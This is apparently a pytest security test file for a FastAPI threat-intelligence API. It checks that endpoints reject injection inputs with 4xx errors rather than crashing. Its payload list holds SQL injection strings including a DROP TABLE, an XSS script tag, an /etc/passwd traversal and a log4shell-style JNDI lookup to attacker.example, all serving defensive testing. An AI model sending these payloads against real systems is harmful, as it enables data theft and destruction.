"""SQL injection / parameter abuse must not bypass validation or 500 the server.

Routes use SQLAlchemy parameterised queries plus FastAPI/pydantic validation
on query params, so injection should be either rejected (422) or executed
literally (200, with an empty result set).
"""

import pytest

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1; DROP TABLE threat;--",
    "%27%20OR%20%271%27=%271",
    "admin'--",
    "1 UNION SELECT * FROM information_schema.tables",
    "<script>alert(1)</script>",
    "../../../../etc/passwd",
    "${jndi:ldap://attacker.example/x}",  # log4shell-style — must not be acted on
]


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
async def test_threats_endpoint_filters_reject_or_no_op(client, security_seed, payload):
    # `severity` is constrained to an enum — must be rejected (422 / 400).
    r = await client.get("/api/v1/threats", params={"severity": payload})
    assert r.status_code in {400, 422}, (
        f"severity={payload!r} returned {r.status_code} — should be a validation error"
    )
    body = r.text.lower()
    assert "traceback" not in body  # never echo a stack trace


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
async def test_cve_lookup_rejects_garbage(client, security_seed, payload):
    """CVE id has a known shape — anything else must 4xx, never 5xx."""
    r = await client.get(f"/api/v1/cve/{payload}")
    assert r.status_code < 500, f"CVE-{payload!r} blew up with {r.status_code} — must be 4xx"


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
async def test_sector_id_path_param_safe(client, security_seed, payload):
    r = await client.get(f"/api/v1/sectors/{payload}")
    assert r.status_code in {404, 422}, (
        f"sector_id={payload!r} returned {r.status_code} — must be 404/422"
    )
    assert "traceback" not in r.text.lower()


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
async def test_min_score_rejects_non_numeric(client, security_seed, payload):
    r = await client.get("/api/v1/sectors/finance/threats", params={"min_score": payload})
    assert r.status_code in {400, 422}, f"min_score={payload!r} returned {r.status_code}"


async def test_pagination_extremes_are_validated(client, security_seed):
    # Negative offset / overflow limit — must not be accepted silently.
    bad = await client.get("/api/v1/threats", params={"offset": -1, "limit": 99999})
    assert bad.status_code in {400, 422}, (
        f"negative/oversize pagination accepted ({bad.status_code})"
    )
